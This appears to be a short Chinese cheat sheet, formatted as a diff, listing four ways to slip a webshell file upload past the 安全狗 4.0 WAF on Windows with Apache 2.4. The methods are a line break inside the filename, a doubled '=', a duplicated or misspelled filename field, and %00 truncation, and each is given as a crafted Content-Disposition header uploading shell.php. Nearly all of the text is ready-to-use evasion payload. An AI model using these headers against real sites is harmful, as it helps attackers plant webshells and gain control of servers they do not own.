@@ -1,0 +1,14 @@
+win+apache2.4 + 安全狗 4.0
+（1）webshell文件名回车换行绕过
+Content-Disposition: form-data: name==="file"; filename="shell.p 
+hp"
+
+（2）webshell文件名使用 "==" 绕过
+Content-Disposition: form-data: name="file"; filename=="shell.php"
+
+（3）双写 filename=; （诡异的 request 包）
+Content-Disposition: form-data: name="file"; filename=; fielname="shell.php"
+
+(4)%00 截断
+在文件名后面加上 %00 然后 CTRL+SHIFT+U 转成字符，这里后面不用加 .jpg 也可以
+Content-Disposition: form-data: name="file"; fielname="shell.php .jpg"
